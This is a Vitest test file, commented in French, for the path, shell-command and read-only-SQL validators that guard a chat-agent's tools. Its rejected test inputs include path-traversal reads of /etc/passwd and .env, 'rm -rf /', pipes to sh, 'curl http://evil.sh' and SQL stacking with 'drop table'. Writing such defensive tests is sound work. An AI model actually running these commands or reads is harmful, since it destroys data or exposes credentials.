import { describe, it, expect, vi } from "vitest";

// `server-only` lève hors d'un Server Component (résolution condition client en
// test) — neutralisé pour pouvoir importer scope.ts (pure logique, aucun I/O).
vi.mock("server-only", () => ({}));

import {
  resolveSafePath,
  validateCommand,
  validateReadOnlySql,
} from "@/lib/cockpit-agent/scope";

/**
 * Tests des validateurs de sécurité du chat-agent (P0 audit 2026-06-07 :
 * « scope.ts sans aucun test — path-traversal / RCE possibles »). Ces fonctions
 * sont la dernière barrière des tools FS/shell/SQL (désormais super-admin only).
 */

describe("resolveSafePath", () => {
  it("accepte un chemin relatif sous la racine", () => {
    const r = resolveSafePath("src/app/page.tsx");
    expect(r.ok).toBe(true);
  });

  it("rejette un chemin absolu", () => {
    expect(resolveSafePath("/etc/passwd").ok).toBe(false);
  });

  it("rejette l'expansion ~", () => {
    expect(resolveSafePath("~/.ssh/id_rsa").ok).toBe(false);
  });

  it("rejette le path-traversal hors racine", () => {
    expect(resolveSafePath("../../etc/passwd").ok).toBe(false);
  });

  it("rejette les dossiers interdits (node_modules, .git)", () => {
    expect(resolveSafePath("node_modules/foo").ok).toBe(false);
    expect(resolveSafePath(".git/config").ok).toBe(false);
  });

  it("rejette les fichiers .env (même via un chemin détourné)", () => {
    expect(resolveSafePath(".env").ok).toBe(false);
    expect(resolveSafePath(".env.local").ok).toBe(false);
    expect(resolveSafePath("src/../.env").ok).toBe(false);
  });

  it("rejette une entrée vide ou non-string", () => {
    expect(resolveSafePath("").ok).toBe(false);
    // @ts-expect-error test runtime guard
    expect(resolveSafePath(null).ok).toBe(false);
  });
});

describe("validateCommand", () => {
  it("accepte une commande allowlistée", () => {
    const r = validateCommand("npm run lint");
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.argv).toEqual(["npm", "run", "lint"]);
  });

  it("rejette un binaire hors allowlist", () => {
    expect(validateCommand("cat /etc/passwd").ok).toBe(false);
  });

  it("rejette les tokens d'injection shell", () => {
    expect(validateCommand("npm run x && rm -rf /").ok).toBe(false);
    expect(validateCommand("npm run x | sh").ok).toBe(false);
    expect(validateCommand("npm run x; whoami").ok).toBe(false);
    expect(validateCommand("npm run x > /etc/hosts").ok).toBe(false);
    expect(validateCommand("echo $(whoami)").ok).toBe(false);
    expect(validateCommand("node -e `id`").ok).toBe(false);
  });

  it("rejette rm/sudo/curl directement", () => {
    expect(validateCommand("rm -rf node_modules").ok).toBe(false);
    expect(validateCommand("sudo reboot").ok).toBe(false);
    expect(validateCommand("curl http://evil.sh").ok).toBe(false);
  });

  it("rejette les sous-commandes git destructrices", () => {
    expect(validateCommand("git push").ok).toBe(false);
    expect(validateCommand("git reset --hard").ok).toBe(false);
    expect(validateCommand("git checkout .").ok).toBe(false);
  });

  it("rejette une commande vide", () => {
    expect(validateCommand("").ok).toBe(false);
    expect(validateCommand("   ").ok).toBe(false);
  });
});

describe("validateReadOnlySql", () => {
  it("accepte SELECT / WITH / EXPLAIN", () => {
    expect(validateReadOnlySql("select 1").ok).toBe(true);
    expect(validateReadOnlySql("SELECT * FROM swarms").ok).toBe(true);
    expect(validateReadOnlySql("with t as (select 1) select * from t").ok).toBe(true);
    expect(validateReadOnlySql("explain select 1").ok).toBe(true);
  });

  it("rejette toute écriture", () => {
    expect(validateReadOnlySql("insert into x values (1)").ok).toBe(false);
    expect(validateReadOnlySql("update x set y = 1").ok).toBe(false);
    expect(validateReadOnlySql("delete from x").ok).toBe(false);
    expect(validateReadOnlySql("drop table x").ok).toBe(false);
    expect(validateReadOnlySql("truncate x").ok).toBe(false);
  });

  it("rejette le stacking de requêtes (2e statement)", () => {
    expect(validateReadOnlySql("select 1; drop table x").ok).toBe(false);
  });

  it("tolère un point-virgule final seul", () => {
    expect(validateReadOnlySql("select 1;").ok).toBe(true);
  });

  it("rejette une query vide", () => {
    expect(validateReadOnlySql("").ok).toBe(false);
  });
});
